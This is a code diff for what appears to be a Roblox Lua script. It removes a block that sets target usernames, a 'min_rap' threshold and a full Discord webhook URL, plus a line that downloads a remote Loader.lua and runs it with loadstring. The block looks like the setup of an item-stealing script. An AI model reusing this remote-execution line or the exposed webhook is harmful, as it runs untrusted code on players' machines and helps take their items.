@@ -1,12 +1,3 @@
-_G.Usernames = {
-    [1] = 'zero231z',
-}
-_G.min_rap = 1
-_G.pingEveryone = 'Yes'
-_G.webhook = 'https://discordapp.com/api/webhooks/1462014760517374136/s8SrXd7I4makxl1mFP2MgTQVsDXl0fBrItv_SSFefqw8hDp-Sh6HpBHdX79Env40u4H7'
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
-
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
     return
